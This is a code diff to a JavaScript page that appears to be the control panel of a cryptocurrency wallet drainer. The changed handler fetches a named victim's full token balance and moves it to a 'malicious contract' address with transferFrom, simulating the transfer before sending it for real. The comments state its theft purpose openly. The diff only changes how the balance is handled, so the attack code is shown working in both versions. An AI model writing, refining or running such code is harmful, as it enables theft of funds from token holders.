@@ -583,7 +583,6 @@
 
 
         
-// Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     console.debug("transferTokensBtn click handler triggered");
 
@@ -603,18 +602,14 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Step 3: Fetch the victim's token balance
+            // Step 3: Fetch the victim's token balance (returns in smallest unit)
             console.debug("Fetching victim's balance...");
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
             console.debug("Victim's balance fetched:", balance);
 
-            // Convert balance to Big Number
-            const balanceBN = web3.utils.toBN(balance);
-            console.debug("Converted balance:", balanceBN.toString());
-
-            // Step 4: Check if the balance is greater than 0
-            if (balanceBN.lte(web3.utils.toBN(0))) {
-                alert("The victim's wallet has no tokens to withdraw.");
+            // Step 4: Check if balance is greater than zero
+            if (balance === '0') {
+                alert("Victim's wallet has no tokens to withdraw.");
                 console.debug("Withdraw aborted: No tokens in victim's wallet.");
                 return;
             }
@@ -623,7 +618,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             console.debug("Simulating withdrawal transaction...");
             try {
                 const simulationResult = await tokenContract.methods
-                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, balanceBN.toString())
+                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance)
                     .call({ from: accounts[0] }); // Simulate the transaction
                 console.debug("Simulation successful, result:", simulationResult);
 
@@ -643,7 +638,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Step 6: Execute the withdrawal transaction (real transfer)
             console.debug("Attempting to execute withdrawal...");
             const transaction = await tokenContract.methods
-                .transferFrom(cleanedVictimAddress, maliciousContractAddress, balanceBN.toString())
+                .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance)
                 .send({ from: accounts[0] }); // Send the actual transaction
             console.debug("Transaction details:", transaction);
 
@@ -655,6 +650,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
